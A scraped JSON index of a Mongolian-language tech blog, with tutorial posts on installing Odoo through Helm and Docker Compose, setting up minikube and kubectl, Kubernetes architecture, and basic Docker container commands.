үзнэ.\ngcloud суулгах kubectl суулгах gcloud дамжуулан GCP - тэй холбогдоно. Google Cloud Platform - бүртгэл байхгүй бол эхлээд бүртгүүлээрэй.","title":"GKE дээр Odoo-г суулгах"},{"content":"Kubernetes Helm-г ашиглан bitnami тохируулсан апплкэйшнг Күбернетесд суулган үзье. Ингэснээр Күбернетес ажиллагааг энгийн хялбар аргаар харж туршиж болно.\nminikube start-г терминал дээр бичин күбернетэс кластераа ажилууллсан бол:\n# Bitnami Helm Chart рэпо-г эхлээд нэмнэ. $ helm repo add bitnami https://charts.bitnami.com/bitnami # Default namespace-т my-release - нэрэээр Odoo-г суулгана. $ helm install my-release bitnami/odoo Дээрх коммандууыг ажиллуусан бол output терминал дээр харуулна.\nNAME: my-release LAST DEPLOYED: *** NAMESPACE: default STATUS: deployed REVISION: 1 TEST SUITE: None NOTES: ******************************************************************* *** PLEASE BE PATIENT: Odoo may take a few minutes to install *** ******************************************************************* 1. Get the Odoo URL by running: ** Please ensure an external IP is associated to the my-release-odoo service before proceeding ** ** Watch the status using: kubectl get svc --namespace default -w my-release-odoo ** export SERVICE_IP=$(kubectl get svc --namespace default my-release-odoo --template \u0026#34;{{ range (index .status.loadBalancer.ingress 0) }}{{.}}{{ end }}\u0026#34;) echo \u0026#34;Odoo URL: http://$SERVICE_IP/\u0026#34; 2. Obtain the login credentials export ODOO_EMAIL=user@example.com export ODOO_PASSWORD=$(kubectl get secret --namespace default my-release-odoo -o jsonpath=\u0026#34;{.data.odoo-password}\u0026#34; | base64 --decode) echo Email : $ODOO_EMAIL echo Password: $ODOO_PASSWORD Output нь ойлгоход хялбар энгийн зааварчилгаа байгаа, терминал дээр зааврын дагуу хуулж ажилууллна.\nkubectl get svc --namespace default -w my-release-odoo Сервисын статусыг дээрх коммандаар харах боломжтой гэж output дээр тайлбарлсан байгаа. Гэхдээ локал орчинд minikube ашиглаж байгаа үед Load Balancer-н экстернал ip -г авч болохгүй шалтгаан нь Cloud Provider-ууд дээр байдаг шиг Minikube -д ѳѳрт нь Load Balancer layer - байхгүй.\nТиймээс minikube-д экстернал ip-г түр зүүр нээх хэрэгтэй болно. Доор байгаа коммандыг шинэ терминал нээгээд ажилууллна.\nminikube tunnel Ажилуулах үед нууц үг асууна. Нууц үг хийснээр локал орчинд Load Balancer шинээр үүсгэнэ.\nЭсхүл service.type -г LoadBalancer биш NodePort болгоод ажилуулах бас нэг арга бий. Жишээ нь:\nhelm install odoo bitnami/odoo --set serviceType=NodePort kubectl get svc --namespace default -w my-release-odoo - г коммандыг дахин ажилууллаад үзээрэй. Экстернал IP хэсгийг тодорхойлсон байгаа. Одоо SERVICE_IP -г browser дээр хуулаад done.\nПод статус шалгах kubectl get pods release устгаж цэвэрлэх helm uninstall my-release Сервисийн параметруудыг ѳѳрчлѳх конфиг хийх бол эндээс харж болох юм байна. Ѳѳр олон тохихруулга байгаа болохоор заавартай нь танилцаад аваарай.\nСурвалжууд \u0026amp; Bookmarks: https://github.com/helm/helm https://github.com/bitnami/charts https://github.com/bitnami/charts/tree/master/bitnami/odoo https://docs.bitnami.com/kubernetes/get-started-kubernetes/ ","permalink":"https://cadil.github.io/posts/2021-01-13-kubernetes-with-odoo/","summary":"Kubernetes Helm-г ашиглан bitnami тохируулсан апплкэйшнг Күбернетесд суулган үзье. Ингэснээр Күбернетес ажиллагааг энгийн хялбар аргаар харж туршиж болно.\nminikube start-г терминал дээр бичин күбернетэс кластераа ажилууллсан бол:\n# Bitnami Helm Chart рэпо-г эхлээд нэмнэ. $ helm repo add bitnami https://charts.bitnami.com/bitnami # Default namespace-т my-release - нэрэээр Odoo-г суулгана. $ helm install my-release bitnami/odoo Дээрх коммандууыг ажиллуусан бол output терминал дээр харуулна.\nNAME: my-release LAST DEPLOYED: *** NAMESPACE: default STATUS: deployed REVISION: 1 TEST SUITE: None NOTES: ******************************************************************* *** PLEASE BE PATIENT: Odoo may take a few minutes to install *** ******************************************************************* 1.","title":"Helm Chart ашиглан Odoo-г локал орчинд суулгах"},{"content":"Minikube болон kubectl суулгах Minikube ашиглан локал Kubernetes Cluster үүсгэх үзье. Эхлээд minikube суулгана.\nMinikube суулгахдаа: Lunix: Binary:\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 sudo install minikube-linux-amd64 /usr/local/bin/minikube Debain Package:\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_latest_amd64.deb sudo dpkg -i minikube_latest_amd64.deb MacOS: Homebrew ашиглан суулгана.\nbrew install minikube Бусад OS болон дэлгэрэнгүйг эндээс ороод танилцаарай.\nKubectl суулгахдаа: kubectl нь Kubernetes-н Command Line Tool ба cluster инспект хийх лог шалгах deploy хийх зэрэг бүхий л хэрэгтэй коммандууд ажилууллна. Дэлгэрэнгүй\nMinikube асаах: minikube start MacOS дээр асаж буй лог:\n😄 minikube v1.15.1 on Darwin 10.15.7 ✨ Using the hyperkit driver based on existing profile 👍 Starting control plane node minikube in cluster minikube 🔄 Restarting existing hyperkit VM for \u0026#34;minikube\u0026#34; ... ... 🏄 Done! kubectl is now configured to use \u0026#34;minikube\u0026#34; cluster and \u0026#34;default\u0026#34; namespace by default Minikube унтраах: minikube stop ","permalink":"https://cadil.github.io/posts/2021-01-12-kubernetes-install/","summary":"Minikube болон kubectl суулгах Minikube ашиглан локал Kubernetes Cluster үүсгэх үзье. Эхлээд minikube суулгана.\nMinikube суулгахдаа: Lunix: Binary:\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 sudo install minikube-linux-amd64 /usr/local/bin/minikube Debain Package:\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_latest_amd64.deb sudo dpkg -i minikube_latest_amd64.deb MacOS: Homebrew ашиглан суулгана.\nbrew install minikube Бусад OS болон дэлгэрэнгүйг эндээс ороод танилцаарай.\nKubectl суулгахдаа: kubectl нь Kubernetes-н Command Line Tool ба cluster инспект хийх лог шалгах deploy хийх зэрэг бүхий л хэрэгтэй коммандууд ажилууллна. Дэлгэрэнгүй","title":"Minikube болон kubectl суулгах"},{"content":"Күбернетес Орчин Хѳгжүүлэгч нарт илүү хѳнгѳн орчин, локал дээр ажиллах, тестийн орчин гэх мэт орчнуудад зориулан гаргасан хувилбарууд байна:\nk3s-н илүү хѳнгѳн бүтэцтэй болохоор Күбернетесд хэрэггүй гэсэн зүйлсийг хасаад зѳвхѳн чухал зүйлсийг авсан хувилбар байна. Яагаад ийм хувилбар хэрэгтэй болсон бэ гэхээр IoT, ARM суурьт CPU дээр ажиллах үед хѳнгѳн бүтэцтэй байхад хялбар ажиллагаа хурд чухал. Олон Raspberry Pi-г нэгтгээд тус тусд нь кластер болгоё гэж үзвэл k8s(Kubernetes)-с илүү k3s илүү тохиромжтой.\nKind нь локал орчинд Kubernetes турших, хийсвэр кластер үүсгэх, хѳгжүүлэлт, туршилт хийх үед ашиглана.\nMinikube - Kind-тай адилхан локал орчинд Күбернетесийг кластер дээр ажилууллах. Load Balancer, VM, container, docker, external ip, internal ip, tunnel гээд бүгдийг Күбернетес орчинд зориулад single node үүсгэнэ.\n","permalink":"https://cadil.github.io/posts/2021-01-11-kubernetes-environment/","summary":"Күбернетес Орчин Хѳгжүүлэгч нарт илүү хѳнгѳн орчин, локал дээр ажиллах, тестийн орчин гэх мэт орчнуудад зориулан гаргасан хувилбарууд байна:\nk3s-н илүү хѳнгѳн бүтэцтэй болохоор Күбернетесд хэрэггүй гэсэн зүйлсийг хасаад зѳвхѳн чухал зүйлсийг авсан хувилбар байна. Яагаад ийм хувилбар хэрэгтэй болсон бэ гэхээр IoT, ARM суурьт CPU дээр ажиллах үед хѳнгѳн бүтэцтэй байхад хялбар ажиллагаа хурд чухал. Олон Raspberry Pi-г нэгтгээд тус тусд нь кластер болгоё гэж үзвэл k8s(Kubernetes)-с илүү k3s илүү тохиромжтой.","title":"Күбернетес Орчин"},{"content":"Күбернетес түүхээс 2014 оны дунд үеэс Google-н Borg систем дээрээс суурь тавигдаж тухайн үедээ уг тѳсѳл дээр ажиллаж байсан хѳгжүүлэгч нар нэгдэн цааш хѳгжүүлэлт хийсэн байна. Google дэх уг тѳслийн анхдагч нэр Project 7 буюу Star Trek кинон дээрх зохиол дүрүүдийн хэсгээс нэр, логон санаа гарсан юм байна. Күбернетес цааш жѳгжүүлэлтийн явцад C++ хэлээс Go хэл рүү шилжин Kubernetes \u0026ldquo;v1\u0026rdquo; 2015 оны 7-р сард 10-нд release-ээ анх гарчээ.\nКүбернетес гэж юу вэ? Товчоор Күбернетес нь контейнеруудыг удирдан зохион байгуулж кластер(ууд) доторх апплкэйшнг өргөтгөл хийх автоматжуулалт. Продакшн орчинг дагаад Хѳгжүүлэлтийн орчин автомэйшн хийгдэнэ (Travis, Github Actions, Jenkins гэх мэт нэмэлт CI хэрэглэх байх).\nСурвалж: Kubernetes documentation\nMaster Node (aka: Control Plane) CLI, клинентаас илгээгдэж байгаа ѳгѳгдлүүд API - гаар дамжин Мастер node -д ирэн шийдвэрлэгдэнэ. Мастер Node -г ажиллагааг дэлгэрүүлбэл:\nkube-apiserver etcd kube-controller-manager kube-scheduler Бүтцийн дагуу задлан авч үзвэл:\nkube-apiserver: Күбернетес кластер доторх хүсэлтийг зохицуулан шийдвэрлэнэ. Жишээ нь под, репликас тохируулга, ѳргѳтгѳлүүд kube-scheduler, kube-controller-manager ирсэн хүсэлтүүд Күбернетес API серверээр дамжин кластер дах шинэчлэл ѳѳрчлѳлтийг хийж гүйцэтгэнэ. etcd: Key Value Store нь kubernetes - тэй хоршиж ажиллахдаа кластер(ууд)-т ѳгѳгдлийг хадаглах backend ажиллагааг хангана. Доорх жишээнд мастер node дотор ectd -г под хэлбэрээр хоршин ажиллаж байна.\nСурвалж: Kubernetes documentation\nДоорх жишээнд ectd -г экстернал кластер болгон мастер node - тэй хоршин ажиллаж байна. Ингэснээр хамгаалалт болон ѳргѳтгѳл хийхэд гэх мэт илүү уян хатан тѳлѳвтэй болно.\nСурвалж: Kubernetes documentation\nПод үүсгэж буй ажиллагааг харуулсан зураг. Etcd - ажиллагааг ойлгоход хялбар зураг\nСурвалж: blog.heptio.com\nkube-controller-manager: Системийн хэвийн ажиллаж байгаа эсэхийг давтамжтайгаар шалгах процесс. kube-scheduler: Күбернетес хуваарилагч нь аль под аль node руу хуваарилагдан очих ёстойг тодорхойлно. Хуваарилагчаас тодорхойлсон бүтцийн дагуу kubelet цааш хариуцан зѳѳвѳрлѳх үйлдийг хийнэ. Worker Node kubelet kube-proxy Container runtime kubelet: Подтой холбогдон контейнер(ууд) хэвийн ажиллаж байгааг хянах, ажилууллах үйлдлийг API серверээр дамжуулан мастер node-тэй холбож ѳгдѳг. Ѳѳрѳѳр хэлбэл worker node-ыг мастер node-тэй холбох зуучлагч юм.\nkube-proxy: Сервис дээр worker node тус бүр дээр load balancer (ачаалал тэнцвэржүүлэгч) хийж IP хаяг болон сүлжээний урсгалыг зохицуулдаг.\nContainer runtime: Контейнерын lifecycle-г тодорхойлж байдаг. Күбернетэс CRI нэвтрүүлж контейнерийн runtime-уудыг дэмжин ажиллана. Үүнд Docker, containerd, CRI-O гэх мэт.\nПод: Кластер дотор нэг эсхүл олон контейнеруудаас бүрдэн ажиллаж байгаа системийн илэрхийлэл бол под юм.\nНэг подод нэг контейнер Олон подод олон контейнерууд Под доторх контейнер(ууд) ѳѳрийн нѳѳц, нетворкийг хуваалцан ашиглана. Ѳѳрѳѳр хэлбэл нэг эсхүл олон контейнеруудыг холбон нэг подод оруулан (контейнерууд) хоорондоо холбогдон үйлдэл хийх боломжтой тусгаарлагдсан орчин үүсгэнэ.\nСурвалжууд \u0026amp; Bookmarks https://etcd.io/ https://github.com/k3s-io/k3s https://www.ibm.com/cloud/blog/kubernetes-ingress https://k3s.io/ https://kind.sigs.k8s.io/ https://kubernetes.io/docs/concepts/services-networking/ingress/ https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/#configure-probes) https://kubernetes.io/docs/tasks/tools/ https://medium.com/@tumenzul/kubernetes-%D0%BD-%D0%B0%D0%B6%D0%B8%D0%BB%D0%BB%D0%B0%D0%B3%D0%B0%D0%B0%D0%BD%D1%8B-%D0%B7%D0%B0%D1%80%D1%87%D0%BC%D1%8B%D0%B3-%D0%BE%D0%B9%D0%BB%D0%B3%D0%BE%D1%85-%D0%BD%D1%8C-abc9c0b82d35 https://medium.com/better-programming/a-closer-look-at-etcd-the-brain-of-a-kubernetes-cluster-788c8ea759a5 https://medium.com/faun/what-is-a-kubernetes-pod-67215193ed98 https://medium.com/google-cloud https://medium.com/google-cloud/understanding-kubernetes-networking-pods-7117dd28727 https://medium.com/jorgeacetozi/kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186 https://medium.com/swlh/kubernetes-architecture-explained-in-brief-6a07f59193e https://mn.wikipedia.org/wiki/Load_balancing https://bells17.medium.com/kubernetes-ccm-d4d3c71ba523 https://www.cncf.io/blog/2020/12/14/kubernetes-101-an-introduction/ https://github.com/kodekloudhub/certified-kubernetes-administrator-course ","permalink":"https://cadil.github.io/posts/2021-01-09-kubernetes-history/","summary":"Күбернетес түүхээс 2014 оны дунд үеэс Google-н Borg систем дээрээс суурь тавигдаж тухайн үедээ уг тѳсѳл дээр ажиллаж байсан хѳгжүүлэгч нар нэгдэн цааш хѳгжүүлэлт хийсэн байна. Google дэх уг тѳслийн анхдагч нэр Project 7 буюу Star Trek кинон дээрх зохиол дүрүүдийн хэсгээс нэр, логон санаа гарсан юм байна. Күбернетес цааш жѳгжүүлэлтийн явцад C++ хэлээс Go хэл рүү шилжин Kubernetes \u0026ldquo;v1\u0026rdquo; 2015 оны 7-р сард 10-нд release-ээ анх гарчээ.\nКүбернетес гэж юу вэ?","title":"Күбернетес тухай"},{"content":"Odoo -г Docker-с ажилууллах Odoo -н тухай Bitnami-г ашиглан Bitnami-docker-odoo - ажилууллах docker-compose - коммандын талаар Docker Volume \u0026amp; persistent volume claim талаар Docker-compouse ажилууллах Odoo-н тухайд Нээлттэй эх дээрх бизнес апплкэйшн ERP нь вэб дээр бүрэн ажиллах, ѳѳр системтэй интеграци хийх боломж, l10n зэргийг шийдсэн цогц апплкэйшн юм.\nBitnami-н тухайд Нээлттэй эх дээр суурьтай OSS софтвейрыг хялбар аргаар хүссэн орчин дээр суулган ажилуулна. Клоуд хостинг хийж байгаа бол Helm Chart -г ашиглан күбэрнетес, клустер-г хялбархан тохируулна. Гэхдээ күбэрнетес, клустертэй ажиллаж байгаа үед гарын авлага, документ, тест зэргийг сайтар судалсны дараа турших хэрэгтэй.\nDocker Compose Compose нь нэгээс олон контейнеруудыг нэг дор ажилууллах үед YAML файл дотор тохируулсан бүтцийг ашиглан докер ажиллах процесс юм.\nДокэр Compose үндсэн бүтэц:\nDockerfile docker-compose.yml - апплкэйшн тус бүрийн бүтцийг тодорхойлох хэсэг. Файл дотор байгаа бүтцийн дагуу апплкэйшн серверүүдийг асааж тусгаарлагдсан орчин үүсгэнэ. version: \u0026#39;2\u0026#39; services: postgresql: image: \u0026#39;docker.io/bitnami/postgresql:11-debian-10\u0026#39; environment: - ALLOW_EMPTY_PASSWORD=yes volumes: - \u0026#39;postgresql_data:/bitnami/postgresql\u0026#39; odoo: image: \u0026#39;docker.io/bitnami/odoo:14-debian-10\u0026#39; ports: - \u0026#39;80:8069\u0026#39; - \u0026#39;443:8071\u0026#39; volumes: - \u0026#39;odoo_data:/bitnami\u0026#39; depends_on: - postgresql volumes: postgresql_data: driver: local odoo_data: driver: local Bitnami дах Odoo V14-н сервер, апплкэйшнг тодорхойлж байгаа docker-compose.yml -г задалж үзвэл postgresql, odoo гэсэн хоёр контейнераас services бүрдэж байна.\nALLOW_EMPTY_PASSWORD=yes - ѳгѳгдлийн санг нууц үггүйгээр хандалт хийдэг болгож байна (тест хийж байгаа үед тохиромжтой). Продакшн орчинд тохиромжгүй сонголт. ports - [host-port]:[container-port] Хостинг портыг 80, 443 контейнер дэх 8069, 8071 порттой холбож байна. CLI - рүү бичвэл: $ docker run -p 80:8069 --name odoo depends_on - Compose хийхдээ эхлээд postgresql тодорхойлсон байна. Үүний дараа Odoo-г тохируулж байна. Ингэснээр ялгаатай хоёр контейнерээс хамааралтай байх нѳхцлийг тодорхойлж ѳгнѳ. Ѳѳрѳѳр хэлбэл нетворкинг хийж байгаа үед дарааллыг тодорхойлж ѳгѳх ба Odoo асахаас ѳмнѳ нь заавал Postgresql ассан байх ёстойг compose-д сануулж байна гэж хэлж болох юм. volumes - compose хийгдэж байгаа YAML-г CLI -руу хѳрвүүлбэл: $ docker volume create --driver local --name postgresql_data $ docker volume create --driver local --name odoo_data буюу [Докэр хост] дотор odoo_data, postgresql_data гэсэн нэртэй local volume үүсгэж ѳгнѳ. Докэр хост-г дэлгэрүүлбэл:\nДокэр ажиллах бүтэц нь Docker Engine тѳвтэй ба дараах гурван хэсгээс бүрдэнэ.\nDocker daemon - Docker API хүсэлтүүд хүлээн авч image, container, network, volume - зэргийн зохион байгуулалт хийх, бусад Docker Service-үүдтэй deamon -ѳѳр дамжин холбогдох гэх мэт. Docker CLI (Command Line Interface) REST API - Клиенттай холбогдох, Docker deamon-той уялдан харилцана. Ѳѳрѳѳр хэлбэл докэр дотор ажиллаж байгааг image-с тусад нь volume үүсгэн ѳгч байна. Ингэснээр тухайн контейнер унтарсан ч дата персист тѳлѳвтэй дахин ашиглаж болно гэсэн юм. \u0026ndash;driver гэдэг нь Докэр plugin ашиглаад зѳвхѳн Докэр роот-с хандалт хийх эрх локал volume үүсгэж байна. Датаг холбох ѳѳр нэг арга нь docker-compose дотор хостинг directory-г оноох боломжтой. Гэхдээ non-root хэрэглэгчийн хувьд харгалзах хандах эрх байгааг нягтлан шалгах хэрэгтэй. Жишээ нь хост direcory-г тодорхойж буй:\nvolumes: - \u0026#39;odoo_data:/bitnami\u0026#39; #Docker Host-с дотор тодорхойлсон volume. - \u0026#39;./extra-addons:/bitnami/odoo/addons\u0026#39; # Хост directory-г Container руу оруулж байна. odoo_data:/bitnami дотор Odoo-г ажиллаж байх үеийн filestore -д Docker Host дотор odoo_data volume-д үүснэ. Docker volume руу зѳвхѳн Docker hosting хийж байгаа root хэрэглэгч хандах боломжтойг анхаарна уу.\n./extra-addons:/bitnami/odoo/addons - ./extra-addons, directory -г Odoo контейнер дах /bitnami/odoo/addons руу оруулж байна. Ингэснээр гуравдагч эдгээдийн модиуль болон хѳгжүүлэлтийн орчин дах нэмэлт модиулыг суулган ажиллуулах боломжтой болно.\n/bitnami/odoo/addons-г conf файл дотор тодорхойлж ѳгсѳн эсэхийг шалгах:\n$ docker exec -it \u0026lt;container-name\u0026gt; cat /opt/bitnami/odoo/odoo-server.conf Bitnami -г дах Dockerfile болон нэмэлт pkg суух үед Odoo-гийн коор модиулидын directory болон нэмэлтээр суулгах модиулын directory-г тодорхойлон .conf файлд тохируулсан байгааг харж болно.\n[options] addons_path = /opt/bitnami/odoo/odoo/addons,/opt/bitnami/odoo/addons ... docker-compose.yml - файл сүүлийн байдлаар:\nversion: \u0026#39;2\u0026#39; services: postgresql: image: \u0026#39;docker.io/bitnami/postgresql:11-debian-10\u0026#39; environment: - ALLOW_EMPTY_PASSWORD=yes volumes: - \u0026#39;postgresql_data:/bitnami/postgresql\u0026#39; odoo: image: \u0026#39;docker.io/bitnami/odoo:14-debian-10\u0026#39; ports: - \u0026#39;80:8069\u0026#39; - \u0026#39;443:8071\u0026#39; volumes: - \u0026#39;odoo_data:/bitnami\u0026#39; - \u0026#39;./extra-addons:/bitnami/odoo/addons\u0026#39; depends_on: - postgresql volumes: postgresql_data: driver: local odoo_data: driver: local Бүтэц:\n... # tree /bitnami-odoo/ |-- extra-addons |-- docker-compose.yml ... Docker-compose ажилууллах: $ docker-compose up -d Image-үүд татаж дуусан networking хийн done болсон бол:\nStatus: Downloaded newer image for bitnami/odoo:14-debian-10 Creating bitnami-odoo_postgresql_1 ... done Creating bitnami-odoo_odoo_1 ... done http://localhost/web/login хаягаар хандан bitnami -с тодорхойлсон нэвтрэх нэр: user@example.com нууц үг: bitnami, Odoo руу нэвтрэн орно. Эсхүл шинээр db тохируулах бол \u0026lsquo;http://localhost/web/database/selector - хаягаар орон тохируулж болно.\nDocker-compose унтраах: $ docker-compose down Volume шалгах: docker volume ls Volume устгах: docker volume rm \u0026lt;volume-name\u0026gt; ","permalink":"https://cadil.github.io/posts/2020-12-25-docker-compose/","summary":"Odoo -г Docker-с ажилууллах Odoo -н тухай Bitnami-г ашиглан Bitnami-docker-odoo - ажилууллах docker-compose - коммандын талаар Docker Volume \u0026amp; persistent volume claim талаар Docker-compouse ажилууллах Odoo-н тухайд Нээлттэй эх дээрх бизнес апплкэйшн ERP нь вэб дээр бүрэн ажиллах, ѳѳр системтэй интеграци хийх боломж, l10n зэргийг шийдсэн цогц апплкэйшн юм.\nBitnami-н тухайд Нээлттэй эх дээр суурьтай OSS софтвейрыг хялбар аргаар хүссэн орчин дээр суулган ажилуулна. Клоуд хостинг хийж байгаа бол Helm Chart -г ашиглан күбэрнетес, клустер-г хялбархан тохируулна.","title":"Odoo -г Docker-с ажилууллах"},{"content":"Localhost дээр Nginx ажилууллах Локалхост дээр Nignx вэбсервер асаах\ndocker run -d -p 80:80 --name webserver nginx Коммандын ажиллаж буй зарчим:\ndocker - Докэр ачааллах үндсэн комманд. run - Контейнер ажлууллна. -d - Контейнерыг салангид тѳлѳвтэйгээр ажиллуулна. Процесс (веб-сервер) зогсвол контейнер мѳн зогсоно. -p 80:80 - Хостинг портыг 80 контейнер дэх 80 порттой [host-port]:[container-port] холбох үед ашиглана. [--name] - Контейнерт нэр онооно. nginx - Локал дээр ийм нэртэй repo байгаа эсэхийг шалгаад байхгүй бол Docker Hub - аас nginx image - татаж авна. Tag - ыг тодорхой бичиж ѳгѳѳгүй бол хамгийн сүүлийн хувилбар буюу nginx:latest - татаж авна. Дээрх комманд ажиллаж дуусан бол browser-с http://localhost:80/ - хандан Nginx -д ажиллаж байгааг шалгаарай.\n","permalink":"https://cadil.github.io/posts/2020-12-21-nginx-container/","summary":"Localhost дээр Nginx ажилууллах Локалхост дээр Nignx вэбсервер асаах\ndocker run -d -p 80:80 --name webserver nginx Коммандын ажиллаж буй зарчим:\ndocker - Докэр ачааллах үндсэн комманд. run - Контейнер ажлууллна. -d - Контейнерыг салангид тѳлѳвтэйгээр ажиллуулна. Процесс (веб-сервер) зогсвол контейнер мѳн зогсоно. -p 80:80 - Хостинг портыг 80 контейнер дэх 80 порттой [host-port]:[container-port] холбох үед ашиглана. [--name] - Контейнерт нэр онооно. nginx - Локал дээр ийм нэртэй repo байгаа эсэхийг шалгаад байхгүй бол Docker Hub - аас nginx image - татаж авна.","title":"Localhost дээр Nginx ажилууллах"},{"content":"Ubuntu контейнер ажилууллах docker run ubuntu Ubuntu контейнер руу shell -ээр хандах docker run -ti \u0026lt;your-container-name\u0026gt; /bin/bash Эсвэл:\ndocker exec -ti \u0026lt;your-container-name\u0026gt; bash Note: shell-с гарахдаа Ctrl + D\nАжиллаж байгаа контейнер инспект хийх (inspecting) Контейнер нэрийг тодорхойлох.\ndocker ps -a Контейнер нэрийг ашиглан инспект хийх.\ndocker inspect \u0026lt;your-container-name\u0026gt; IP хаяг тодорхойлох docker inspect \u0026lt;your-container-name\u0026gt; | grep IPAddress docker inspect --format {{.NetworkSettings.IPAddress}} \u0026lt;your-container-name\u0026gt; Лог шалгах docker logs \u0026lt;your-container-name\u0026gt; Контейнер зогсоох docker stop \u0026lt;your-container-name\u0026gt; Ажиллаагүй байгаа контейнер цэвэрлэх (clean up) docker rm -v $(docker ps -aq -f states=exited) ","permalink":"https://cadil.github.io/posts/2020-12-21-ubuntu-container/","summary":"Ubuntu контейнер ажилууллах docker run ubuntu Ubuntu контейнер руу shell -ээр хандах docker run -ti \u0026lt;your-container-name\u0026gt; /bin/bash Эсвэл:\ndocker exec -ti \u0026lt;your-container-name\u0026gt; bash Note: shell-с гарахдаа Ctrl + D\nАжиллаж байгаа контейнер инспект хийх (inspecting) Контейнер нэрийг тодорхойлох.\ndocker ps -a Контейнер нэрийг ашиглан инспект хийх.\ndocker inspect \u0026lt;your-container-name\u0026gt; IP хаяг тодорхойлох docker inspect \u0026lt;your-container-name\u0026gt; | grep IPAddress docker inspect --format {{.NetworkSettings.IPAddress}} \u0026lt;your-container-name\u0026gt; Лог шалгах docker logs \u0026lt;your-container-name\u0026gt; Контейнер зогсоох docker stop \u0026lt;your-container-name\u0026gt; Ажиллаагүй байгаа контейнер цэвэрлэх (clean up) docker rm -v $(docker ps -aq -f states=exited) ","title":"Ubuntu контейнер ажилууллах"},{"content":"Виртуалчлал Виртуал машин: Софтвейр контейнр дотор (үйлдлийн систем + апплкэйшнг) салангид бүтэцтэй ажиллуулна. Нэг физик серверт олон вирутал машин (ВМ) ажилуулах боломжтой. Гипервизор (Виртуал машин мониторинг ВММ) Виртуал машин бүрийн нѳѳцийг тооцоолж динамик хуваарилалт хийнэ.\nКонтейнр: Хѳнгѳн байх бүтэцтэй виртуалчлал (контейнэр) нэг хостинг дотор ажиллах боломж. Үйлдлийн системээс ялгаатай нь кернел байхгүй. Хостинг хийж байгаа машины кернелийг хуваалцаж ашиглана (Илүү хѳнгѳн бүцэтэй болгох гэж тэр). Контейнр хоорондын тусгаарлалт хийхдээ процесс тѳлѳвт тусгаарлалт ашиглана.\nДокэр контейнр Линукс контейнр (LXC) - с үүдэлтэй. LXC нь нэг хостинг дээр олон Линукс систем ажлууллах үйлдийн систем суурт виртуал аргачлал юм. Namespace, cgroup -ээр дамжих замаар LXC ажиллана. Докэр эхэн үедээ сингл-апплкэйшн LXC контейрн болгож LXC өөрчлөлт шинэчлэл хийгдэх болгонд илүү уян хатан, зѳѳвѳрлѳх боломжтой болсон.\nDocker нь кодыг нэмэлтүүдийн хамт image дотор байрлуулна. Нээлттэй эх дээрх багаж\n","permalink":"https://cadil.github.io/posts/2020-12-16-docker-container/","summary":"Виртуалчлал Виртуал машин: Софтвейр контейнр дотор (үйлдлийн систем + апплкэйшнг) салангид бүтэцтэй ажиллуулна. Нэг физик серверт олон вирутал машин (ВМ) ажилуулах боломжтой. Гипервизор (Виртуал машин мониторинг ВММ) Виртуал машин бүрийн нѳѳцийг тооцоолж динамик хуваарилалт хийнэ.\nКонтейнр: Хѳнгѳн байх бүтэцтэй виртуалчлал (контейнэр) нэг хостинг дотор ажиллах боломж. Үйлдлийн системээс ялгаатай нь кернел байхгүй. Хостинг хийж байгаа машины кернелийг хуваалцаж ашиглана (Илүү хѳнгѳн бүцэтэй болгох гэж тэр). Контейнр хоорондын тусгаарлалт хийхдээ процесс тѳлѳвт тусгаарлалт ашиглана.","title":"Докэр контейнр болон Виртуалчлал"},{"content":"Жишээ контейнер ажилуулах Докэр суулгах\n$ docker run hello-world Docker run командаар контейнер дуудаж ажиллуулна.\nhello-world нэртэй image-г локалаас хайж үзнэ. Хэрэв ийм нэртэй image олдохгүй бол Dockerhub-аас адил нэртэй image-г хайн ажиллуулна.\nHello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \u0026#34;hello-world\u0026#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ Контейнер ажиллаж байгаа эсэхийг шалгах docker ps Note: Үр дүнд ажиллаж байгаа контейнер лист буцаахгүй буюу хоосон утга буцаавал контейнер ажиллаж дуусаад зогссон байна.\nСүүлийн байдлаар ажиллаж байсан контейнер шалгах $ docker ps -l CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 562a70b66077 hello-world \u0026#34;/hello\u0026#34; 8 minutes ago Exited (0) 8 minutes ago zealous_feynman ","permalink":"https://cadil.github.io/posts/2020-12-17-hello-world-container/","summary":"Жишээ контейнер ажилуулах Докэр суулгах\n$ docker run hello-world Docker run командаар контейнер дуудаж ажиллуулна.\nhello-world нэртэй image-г локалаас хайж үзнэ. Хэрэв ийм нэртэй image олдохгүй бол Dockerhub-аас адил нэртэй image-г хайн ажиллуулна.\nHello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \u0026#34;hello-world\u0026#34; image from the Docker Hub.","title":"Жишээ контейнер ажилуулах (hello-world)"},{"content":"Танилцуулга Хамгийн хэрэгтэй гэсэн Development - gem - үүдээс эхнээс нь танилцаж явах болно. Мэдээж бид бүхэнд юуны ѳмнѳ rspec-rails gem хэрэгтэй. Rspec нь тест хийх зориулалттай framework ба олон талт боломжуудтай юм.\nDev Gems group :development, :test do gem \u0026#39;better_errors\u0026#39; gem \u0026#39;capybara-webkit\u0026#39; gem \u0026#39;factory_girl_rails\u0026#39; gem \u0026#39;ffaker\u0026#39; gem \u0026#39;database_cleaner\u0026#39; gem \u0026#39;letter_opener\u0026#39; gem \u0026#39;rspec-rails\u0026#39; gem \u0026#39;pry\u0026#39; gem \u0026#39;pry-nav\u0026#39; gem \u0026#39;pry-rails\u0026#39;, \u0026#39;~\u0026gt; 0.3.2\u0026#39; gem \u0026#39;simple_bdd\u0026#39; gem \u0026#39;shoulda-matchers\u0026#39; gem \u0026#39;spring\u0026#39; end Дээр байгаа нийт 13 Development, test - gem - үүдийг нэг нэгээр нь дэлгэрэнгүй үзэх 